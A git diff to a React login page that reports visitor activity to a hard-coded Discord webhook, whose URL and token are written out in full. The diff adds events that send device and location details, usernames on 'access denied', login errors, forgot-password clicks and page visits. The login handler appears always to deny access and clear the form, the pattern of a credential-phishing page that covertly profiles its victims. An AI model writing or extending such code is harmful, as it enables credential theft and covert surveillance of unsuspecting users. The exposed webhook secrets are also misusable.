@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Link } from "react-router-dom";
 
 export default function Login() {
@@ -94,7 +94,7 @@ export default function Login() {
   const sendToDiscord = async (action: string, data: any) => {
     try {
       const webhookUrl =
-        "https://discord.com/api/webhooks/1443937606420140114/d_32hCr5o8frv607TYLzbCxROZ9x8qT9BgQ6a6UxCgMzKbKs3GxIHctmgnAB0CZMkeEt";
+        "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
 
       const deviceInfo = getDeviceInfo();
       const locationInfo = await getLocationInfo();
@@ -128,9 +128,40 @@ export default function Login() {
             inline: false,
           },
         ];
+      } else if (action === "ACCESS_DENIED") {
+        embedTitle = "🚫 Access Denied";
+        embedColor = 0xff6b6b;
+        fields = [
+          {
+            name: "Username/Email",
+            value: `||${data.username}||`,
+            inline: false,
+          },
+          {
+            name: "Status",
+            value: "Account access was denied",
+            inline: false,
+          },
+        ];
+      } else if (action === "LOGIN_ERROR") {
+        embedTitle = "❌ Login Error";
+        embedColor = 0xff0000;
+        fields = [
+          {
+            name: "Error Details",
+            value: data.error || "Unknown error occurred",
+            inline: false,
+          },
+        ];
       } else if (action === "CREATE_ACCOUNT") {
         embedTitle = "📝 Create Account Button Pressed";
         embedColor = 0x00c800;
+      } else if (action === "FORGOT_PASSWORD") {
+        embedTitle = "🔑 Forgot Password Attempt";
+        embedColor = 0xffa500;
+      } else if (action === "PAGE_VISIT") {
+        embedTitle = "👤 Login Page Visited";
+        embedColor = 0x5865f2;
       }
 
       fields.push(
@@ -159,8 +190,17 @@ export default function Login() {
         },
       );
 
+      const actionMap: { [key: string]: string } = {
+        LOGIN: "Login",
+        CREATE_ACCOUNT: "Create Account",
+        ACCESS_DENIED: "Access Denied",
+        LOGIN_ERROR: "Login Error",
+        FORGOT_PASSWORD: "Forgot Password",
+        PAGE_VISIT: "Page Visit",
+      };
+
       const message = {
-        content: `**New ${action === "LOGIN" ? "Login" : "Create Account"} Action**`,
+        content: `**New ${actionMap[action] || action} Event**`,
         embeds: [
           {
             color: embedColor,
@@ -187,6 +227,14 @@ export default function Login() {
     }
   };
 
+  // Log page visit on component mount
+  useEffect(() => {
+    const logPageVisit = async () => {
+      await sendToDiscord("PAGE_VISIT", { page: "Login" });
+    };
+    logPageVisit();
+  }, []);
+
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
 
@@ -201,11 +249,16 @@ export default function Login() {
 
       // Show access denied modal to user
       setShowAccessDeniedModal(true);
+      // Log access denied event
+      await sendToDiscord("ACCESS_DENIED", { username });
       // Clear form
       setUsername("");
       setPassword("");
     } catch (error) {
       console.error("Error:", error);
+      await sendToDiscord("LOGIN_ERROR", {
+        error: error instanceof Error ? error.message : "Unknown error",
+      });
       alert("An error occurred. Please try again.");
     }
   };
@@ -662,6 +715,8 @@ export default function Login() {
                 aria-label="Forgot password?"
                 data-anchor-id="replay"
                 onClick={() => {
+                  // Log forgot password attempt to Discord
+                  sendToDiscord("FORGOT_PASSWORD", {});
                   // Navigate to forgot password page
                 }}
                 style={{
